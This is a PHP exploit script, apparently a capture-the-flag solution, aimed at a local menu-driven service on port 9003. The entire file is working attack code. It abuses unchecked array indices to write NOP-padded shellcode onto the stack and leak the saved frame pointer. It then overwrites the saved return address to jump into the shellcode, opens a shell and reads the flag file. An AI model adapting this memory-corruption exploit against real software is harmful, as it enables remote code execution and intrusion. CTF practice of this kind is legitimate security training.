#!/usr/bin/php
<?php
function menu($socket)
{
	for($i = 0; $i < 4; $i++)
		fgets($socket);
	fread($socket, strlen("choice> "));
}

function get($socket, $index)
{
	menu($socket);
	fputs($socket, "3\n");

	fread($socket, strlen("index> "));
	fputs($socket, "$index\n");

	fread($socket, strlen("array[$index] = "));
	return (int)fgets($socket);
}

function set($socket, $index, $value)
{
	menu($socket);
	fputs($socket, "2\n");

	fread($socket, strlen("index> "));
	fputs($socket, "$index\n");

	fread($socket, strlen("value> "));
	fputs($socket, "$value\n");
}

$socket = fsockopen("127.0.0.1", 9003);


printf("[*] Write shellcode\n");
$shellcode = file_get_contents("shellcode");
$shellcode = str_pad($shellcode, 16 * 8, "\x90", STR_PAD_LEFT);

foreach(unpack("q*", $shellcode) as $i => $val) {
	printf("%d: %d\n", $i - 1, $val);
	set($socket, $i - 1, $val);
}

printf("[*] Leak stack pointer\n");
// 18 contains rbp
$leak = get($socket, 18);
printf("[+] Leak: %X\n", $leak);

// 19 contains rip
$addr = $leak - 0xC0;
set($socket, 19, $addr);

printf("[*] Pop shell\n");
menu($socket);
fwrite($socket, "0\n");

/* Discard dump */
fgets($socket);
for($i = 0; $i < 16; $i++)
	fgets($socket);

fwrite($socket, "cat flag\n");
echo fgets($socket);
